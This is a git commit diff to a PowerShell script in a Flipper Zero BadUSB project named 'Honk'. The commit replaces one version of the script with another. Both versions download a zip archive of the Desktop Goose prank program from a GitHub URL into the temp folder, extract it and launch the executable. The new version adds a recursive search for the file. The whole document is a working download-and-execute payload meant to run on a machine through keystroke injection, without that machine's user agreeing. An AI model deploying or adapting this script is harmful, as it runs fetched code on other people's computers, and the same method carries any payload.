63026c9264d927f02c167199a37233eb707a6c65
Joel N. Reboia <70518069+J-Reboia@users.noreply.github.com>
2026-03-28 10:49:26 +0100

    Changed ps1 to get rid of loop

--- Flipper/BadUsb/Honk/Honk.ps1
+++ Flipper/BadUsb/Honk/Honk.ps1
@@ -1,4 +1,14 @@
-Start-Process "$env:TEMP\H\GooseDesktop.exe" -WorkingDirectory "$env:TEMP\H"
-iwr -Uri "https://github.com/J-Reboia/TheFunHouse/raw/refs/heads/main/Misc/Desktop_Goose_v0.21.zip" -OutFile "$env:TEMP\H.zip";
-Expand-Archive "$env:TEMP\H.zip" -Dest "$env:TEMP\H" -Force;
-(New-Object -ComObject Shell.Application).ShellExecute("$env:TEMP\H\GooseDesktop.exe");
+# 1. Define Paths
+$url = "https://github.com/J-Reboia/TheFunHouse/raw/refs/heads/main/Misc/Desktop_Goose_v0.21.zip"
+$zip = "$env:TEMP\H.zip"
+$dir = "$env:TEMP\H"
+
+# 2. Download and Extract
+iwr -Uri $url -OutFile $zip
+Expand-Archive $zip -Dest $dir -Force
+
+# 3. Run (This searches for the EXE in case it's inside a subfolder)
+$exe = Get-ChildItem -Path $dir -Filter "GooseDesktop.exe" -Recurse | Select-Object -First 1
+if ($exe) {
+    Start-Process $exe.FullName -WorkingDirectory $exe.DirectoryName
+}
